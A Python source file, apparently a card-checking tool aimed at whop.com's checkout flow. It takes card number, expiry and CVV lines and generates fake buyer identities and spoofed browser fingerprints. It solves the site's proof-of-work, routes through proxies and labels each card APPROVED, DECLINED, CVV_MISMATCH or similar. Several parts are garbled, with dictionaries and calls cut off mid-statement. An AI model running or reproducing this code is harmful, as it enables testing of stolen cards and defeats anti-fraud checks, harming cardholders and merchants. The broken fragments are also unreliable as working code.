class Colors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'

    DIM = '\033[2m'

class ProgressLogger:
    def __init__(self, enabled: bool = False):
        self.enabled = enabled
        self.steps = []
        self.current_step = 0

    def step(self, message: str, status: str = "info"):
        if not self.enabled:
            return
        self.current_step += 1
        symbols = {
            "info": f"{Colors.CYAN}[*]{Colors.RESET}",
            "success": f"{Colors.GREEN}[✓]{Colors.RESET}",
            "warning": f"{Colors.YELLOW}[!]{Colors.RESET}",
            "error": f"{Colors.RED}[✗]{Colors.RESET}",
            "pow": f"{Colors.YELLOW}[⚡]{Colors.RESET}",
            "3ds": f"{Colors.BLUE}[🔒]{Colors.RESET}",
            "card": f"{Colors.CYAN}[💳]{Colors.RESET}",
            "fp": f"{Colors.BLUE}[👁]{Colors.RESET}",
        }
        symbol = symbols.get(status, symbols["info"])
        print(f"  {symbol} {message}")
        self.steps.append({"step": self.current_step, "message": message, "status": status})

    def start(self):
        if not self.enabled:
            return
        print(f"\n{Colors.CYAN}{'━' * 50}{Colors.RESET}")
        print(f"{Colors.BOLD}PROCESSING{Colors.RESET}")
        print(f"{Colors.CYAN}{'━' * 50}{Colors.RESET}")

    def finish(self):
        if not self.enabled:
            return
        print(f"{Colors.CYAN}{'━' * 50}{Colors.RESET}")

def extract_dynamic(html: str):
    next_data = None
    m = re.search(r'<script id="__NEXT_DATA__" type="application/json">(.*?)</script>', html)
    if m:
        try:
            next_data = json.loads(m.group(1))
        except:
            pass

    def rec(obj, pat):
        if isinstance(obj, dict):
            for k, v in obj.items():
                if isinstance(v, str):
                    mm = re.search(pat, v)
                    if mm:
                        return mm.group(0)
                elif isinstance(v, (dict, list)):
                    res = rec(v, pat)
                    if res:
                        return res
        elif isinstance(obj, list):
            for item in obj:
                res = rec(item, pat)
                if res:
                    return res
        return None

    def find_plan(obj):
        if isinstance(obj, dict):
            if obj.get("id", "").startswith("plan_") and ("formattedPeriodV2" in obj or "initialPrice" in obj or "rawInitialPrice" in obj):
                return obj.get("id")
            for k, v in obj.items():
                res = find_plan(v)
                if res:
                    return res
        elif isinstance(obj, list):
            for item in obj:
                res = find_plan(item)
                if res:
                    return res
        return None

    plan_id = account_id = bt_key = container = release = None

    if next_data:
        plan_id = find_plan(next_data) or rec(next_data, r'plan_[a-zA-Z0-9]+')
        account_id = rec(next_data, r'biz_[a-zA-Z0-9]+')
        bt_key = rec(next_data, r'key_prod_us_pub_[a-zA-Z0-9]+')
        container = rec(next_data, r'/?\?/?card-assembly/[a-zA-Z0-9]+/?\?/?')
        if container:
            container = container.replace('\\', '')
        release = rec(next_data, r'"release":"([a-f0-9]{40})"')

    if not plan_id:
        plan_id = (re.findall(r'plan_[a-zA-Z0-9]+', html) or [None])[0]
    if not account_id:
        account_id = (re.findall(r'biz_[a-zA-Z0-9]+', html) or [None])[0]
    if not bt_key:
        m2 = re.search(r'key_prod_us_pub_[a-zA-Z0-9]+', html)
        if m2:
            bt_key = m2.group(0)
    if not container:
        m2 = re.search(r'/card-assembly/[a-zA-Z0-9]+/', html)
        if m2:
            container = m2.group(0)
    if not release:
        m2 = re.search(r'"release":"([a-f0-9]{40})"', html) or re.search(r'"buildId":"([a-f0-9]{40})"', html)
        if m2:
            release = m2.group(1)

    return plan_id, account_id, bt_key, container, release or "unknown"

def get_message(resp: Any) -> Optional[str]:
    if not isinstance(resp, dict):
        return None

    for key in ("last_confirmation_error", "last_confirm_error"):
        lce = resp.get(key)
        if isinstance(lce, dict):
            msg = lce.get("message")
            if msg:
                return msg

    payment = resp.get("payment")
    if isinstance(payment, dict):
        for k in ("last_payment_error", "error"):
            lpe = payment.get(k)
            if isinstance(lpe, dict):
                msg = lpe.get("message")
                if msg:
                    return msg

        if payment.get("decline_code"):
            return f"Declined: {payment['decline_code']}"

        if payment.get("status", "").lower() in ("failed", "declined", "canceled"):
            return payment.get("message") or payment["status"]

    if resp.get("decline_code"):
        return f"Declined: {resp['decline_code']}"

    if resp.get("status", "").lower() in ("failed", "declined", "canceled"):
        return resp.get("message") or resp["status"]

    return None

def _base_headers(ua: str, referer: str, release: str, ssk: str = "") -> dict:
    trace = gen_trace()
    return {
        "accept": "*/*",
        "accept-language": "en-US,en;q=0.9",
        "api-version-date": "2026-08-21",
        "origin": "https://whop.com",
        "referer": referer,
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "priority": "u=1, i",
        "sentry-trace": f"{trace}-{gen_span()}-1",
        "baggage": gen_baggage(trace, release),
        "whop-private-schema": "true",
        "x-fern-language": "JavaScript",
        "x-fern-runtime": "browser",
        "x-fern-runtime-version": ua,
        "user-agent": ua,
        "x-ssk": ssk,

def _json_headers(ua: str, referer: str, release: str, ssk: str = "") -> dict:
    h = _base_headers(ua, referer, release, ssk)
    h["content-type"] = "application/json"
    return h

#  POW BYPASS 
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def solve_pow(base: str, prefix: str, suffix: str, max_iter: int = 500_000) -> Optional[int]:
    for i in range(1, max_iter):
        if hashlib.sha256(f"{base}:{i}:{suffix}".encode()).hexdigest().startswith(prefix):
            return i
    return None

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

async def _run_with_client(
    client: httpx.AsyncClient,
    url: str,
    cc: str, mes: str, ano: str, cvv: str,
    proxy: Optional[str] = None,
    progress: Optional[ProgressLogger] = None,
) -> Optional[Dict[str, Any]]:

    # ─── RANDOM IDENTITY
    first_name, last_name, email, phone = _rand_identity()
    ua = _rand_ua()

    # ─── FINGERPRINT BYPASS
    v1_str, v1s_str, v2_str, h1, h1s, h2, tz_name, tz_off, lang, sw, sh = _rand_fp(ua)
    if progress:
        progress.step(f"Fingerprint generated: {h1[:16]}...", "fp")

    # ─── SSK
    ssk = ""
    try:
        with open("ssk.txt") as f:
            ssk = f.read().strip()
    except:
        pass

    parsed = urlparse(url)
    affiliate = parse_qs(parsed.query).get("a", [""])[0]
    referer = url

    # ─── STEP 1: Landing page
    if progress:
        progress.step("Fetching landing page...", "info")
    headers1 = {
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "accept-language": "en-US,en;q=0.9",
        "cache-control": "max-age=0",
        "sec-fetch-dest": "document",
        "sec-fetch-mode": "navigate",
        "sec-fetch-site": "same-origin",
        "sec-fetch-user": "?1",
        "upgrade-insecure-requests": "1",
        "user-agent": ua,
    }
    r1 = await client.get(url, headers=headers1)
    html = r1.text

    plan_id, account_id, bt_key, container, release = extract_dynamic(html)
    if not bt_key:
        bt_key = "key_prod_us_pub_Ew4Bw1f81FPoqphvpuX1VR"
    if not plan_id or not account_id:
        if progress:
            progress.step("Missing plan/account", "error")
        return {"error": "Missing plan/account"}

    if progress:
        progress.step(f"Plan: {plan_id[:24]}...", "success")
        progress.step(f"Account: {account_id[:24]}...", "success")

    # ─── STEP 2: users/me
    await client.get("https://whop.com/api/v1/users/me",
                     headers=_base_headers(ua, referer, release, ssk))

    # ─── STEP 3: checkout_sessions
    if progress:
        progress.step("Creating checkout session...", "info")
    payload3 = {
        "items": [{"plan": plan_id, "quantity": 1}],
        "affiliate_code": affiliate,
        "attribution": {"source": "product_page_direct"},
        "tracking_link_ids_by_account": {},
        "payment_method_types": ["card"],
        "mode": "payment",
        "buyer_email": email
    }
    r3 = await client.post("https://whop.com/api/v1/checkout_sessions",
                           json=payload3,
                           headers=_json_headers(ua, referer, release, ssk))
    if r3.status_code >= 400:
        if progress:
            progress.step(f"Checkout failed: {r3.status_code}", "error")
        return {"error": f"Checkout {r3.status_code}"}
    data3 = r3.json()
    chs_id = data3["id"]
    client_secret = data3["client_secret"]
    account_id = data3.get("seller", {}).get("id", account_id)

    # ─── STEP 4: payment_method_types
    await client.get(
        f"https://whop.com/api/v1/payment_method_types?account_id={account_id}&surface=direct_checkout&plan_id={plan_id}",
        headers=_base_headers(ua, referer, release, ssk)
    )

    # ─── STEP 5: calculate_breakdown
    await client.post(
        f"https://whop.com/api/v1/checkout_sessions/{chs_id}/calculate_breakdown",
        json={"client_secret": client_secret, "supports_buyer_fee": True},
        headers=_json_headers(ua, referer, release, ssk)
    )

    # ─── STEP 6: recognize
    await client.post(
        "https://whop.com/api/v1/session_intents/recognize",
        json={"email": email},
        headers=_json_headers(ua, referer, release, ssk)
    )

    # ─── STEP 7: BT session (Basis Theory)
    if progress:
        progress.step("Creating BT session...", "info")
    device_info = {
        "uaBrands": [
            {"brand": "Not?A_Brand", "version": "8"},
            {"brand": "Chromium", "version": "141"},
            {"brand": "Google Chrome", "version": "141"}
        ],
        "uaMobile": False,
        "uaPlatform": "Windows",
        "languages": ["en-US", "en"],
        "timeZone": tz_name,
        "cookiesEnabled": True,
        "localStorageEnabled": True,
        "sessionStorageEnabled": True,
        "platform": "Win32",
        "hardwareConcurrency": 8,
        "deviceMemoryGb": 8,
        "screenWidth": sw,
        "screenHeight": sh,
        "screenAvailWidth": sw,
        "screenAvailHeight": sh,
        "innerWidth": sw,
        "innerHeight": sh - 100,
        "devicePixelRatio": 1,
        "maxTouchPoints": 0,
        "network": {},
        "plugins": [],
        "mimeTypes": [],
        "webdriver": False,
        "suspectedHeadless": False,
        "webglVendor": "Google Inc. (Intel)",
        "webglRenderer": "ANGLE (Intel, Intel(R) UHD Graphics Direct3D11 vs_5_0 ps_5_0)"
    }
    headers7 = {
        "accept": "application/json",
        "accept-language": "en-US,en;q=0.9",
        "content-type": "application/json",
        "origin": "https://js.basistheory.com",
        "referer": "https://js.basistheory.com/",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",

    if progress:

        "accept-language": "en-US,en;q=0.9",
        "content-type": "application/json",
        "origin": "https://js.basistheory.com",
        "referer": "https://js.basistheory.com/",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": ua,

                           json={
                               "type": "card",

                               "expires_at": expires,
                               "data": {"number": cc}

        except:
            pass

            progress.step("No card token", "error")
        return {"error": "No card token"}

    # ─── STEP 10: confirmation_tokens
    if progress:
        progress.step("Creating confirmation token...", "info")
    exp_year = int(ano)
    if exp_year < 100:
        exp_year += 2000

    payload10 = {
        "account_id": account_id,
        "payment_method": {
            "type": "card",
            "category": "card",
            "card": {"token": card_token}
        },
        "billing_details": {
            "email": email,
            "name": f"{first_name} {last_name}",
            "address": {
                "country": "US",
                "line1": f"{random.randint(100,9999)} Main St",
                "city": "New York",
                "state": "NY",
                "postal_code": f"{random.randint(10000,99999)}"

        "return_url": url,
        "setup_future_usage": "off_session",

            "platform": "Win32",

                            headers=headers10)

        except:
            pass
    if not ctok_id:
        # Extract error message if any
        try:
            err_data = r10.json()
            msg = get_message(err_data)
            if msg:
                return {"error": msg}
        except:
            pass
        if progress:
            progress.step("No confirmation token", "error")
        return {"error": "No confirmation token"}

    # ─── STEP 11: confirm
    if progress:
        progress.step("Confirming checkout...", "info")
    payload11 = {
        "client_secret": client_secret,
        "confirmation_token": ctok_id,
        "attestations": {"tos_accepted": True}
    }

        f"https://whop.com/api/v1/checkout_sessions/{chs_id}/confirm",
        json=payload11,
        headers=_json_headers(ua, referer, release, ssk)
    )
    if r11.text:
        try:
            confirm_data = r11.json()
            msg = get_message(confirm_data)
            if msg:
                return {"error": msg}
        except:
            pass

    # ─── STEP 12: Poll
    if progress:
        progress.step("Polling result...", "info")
    for _ in range(12):
        r12 = await client.get(
            f"https://whop.com/api/v1/checkout_sessions/{chs_id}",
            params={"client_secret": client_secret, "expand[]": "payment"},
            headers=_base_headers(ua, referer, release, ssk)
        )
        if r12.text:
            try:
                cs = r12.json()
                msg = get_message(cs)
                if msg:
                    return {"error": msg}
                next_action = cs.get("next_action")
                if isinstance(next_action, dict):
                    t = next_action.get("type", "")
                    if t in ("use_stripe_sdk", "redirect_to_url", "3ds"):
                        return {"error": "3D Secure"}
                payment = cs.get("payment") or {}
                if isinstance(payment, dict):
                    if payment.get("status", "").lower() in ("succeeded", "paid"):
                        return {"success": True, "data": payment}
                    if payment.get("status", "").lower() in ("requires_action", "requires_confirmation"):
                        return {"error": "3D Secure / Processing"}
            except:
                pass
        await asyncio.sleep(2)

    return {"error": "Open/Processing"}

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  PROCESS WRAPPER
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

async def process_whop(
    url: str,
    cc: str, mes: str, ano: str, cvv: str,
    proxy: Optional[str] = None,
    progress: Optional[ProgressLogger] = None,
) -> Optional[Dict[str, Any]]:

    kw = {"timeout": 30}
    if proxy:
        kw["proxy"] = proxy
        if progress:
            progress.step(f"Using proxy: {proxy[:40]}...", "info")

    try:
        async with httpx.AsyncClient(**kw) as client:
            result = await _run_with_client(client, url, cc, mes, ano, cvv, proxy, progress)
            return result
    except Exception as e:
        return {"error": f"Request failed: {str(e)[:120]}"}

#  HELPERS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def _fix_year(yy: str) -> str:
    yy = yy.strip()
    if len(yy) == 2:
        return f"20{yy}"
    return yy

def _parse_card(raw: str):
    parts = [p.strip() for p in raw.strip().split("|")]
    if len(parts) != 4:
        return None
    cc, mes, ano, cvv = parts
    if not cc or not mes or not ano or not cvv:
        return None
    return cc, mes, _fix_year(ano), cvv

def _extract_result(result: Optional[Dict]) -> tuple[str, str]:
    if result is None:
        return "UNKNOWN", "No response"
    if result.get("error"):
        err = result["error"]
        err_lower = err.lower()
        if "3d secure" in err_lower or "requires_action" in err_lower:
            return "3DS_REQUIRED", err
        if "insufficient" in err_lower or "not enough" in err_lower:
            return "INSUFFICIENT_FUNDS", err
        if "cvv" in err_lower or "cvc" in err_lower:
            return "CVV_MISMATCH", err
        if "expired" in err_lower:
            return "EXPIRED_CARD", err
        if "declined" in err_lower or "decline" in err_lower:
            return "DECLINED", err
        if "rate limit" in err_lower:
            return "RATE_LIMIT", err
        return "ERROR", err
    if result.get("success"):
        return "APPROVED", "Payment Successful"
    return "UNKNOWN", str(result)[:200]
